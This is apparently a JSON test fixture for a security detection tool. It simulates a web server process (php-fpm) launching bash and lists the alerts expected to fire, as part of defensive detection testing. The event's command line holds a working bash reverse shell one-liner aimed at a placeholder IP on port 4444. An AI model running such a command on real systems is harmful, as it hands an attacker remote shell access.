{
  "id": "reverse-shell",
  "name": "Bash reverse shell on a Linux server",
  "techniques": [
    "T1059.004"
  ],
  "source": "sentinelx",
  "events": [
    {
      "event_type": "process",
      "event_action": "process_start",
      "hostname": "web-01",
      "os": "linux",
      "username": "www-data",
      "process_name": "bash",
      "process_path": "/usr/bin/bash",
      "parent_process_name": "php-fpm",
      "parent_process_path": "/usr/sbin/php-fpm",
      "process_command_line": "bash -c 'bash -i >& /dev/tcp/203.0.113.66/4444 0>&1'",
      "@offset": -120
    }
  ],
  "expect": [
    "Reverse Shell Command Line",
    "Web Server Spawned a Shell (Possible Web Shell)"
  ],
  "log_type": null,
  "hunt": false
}
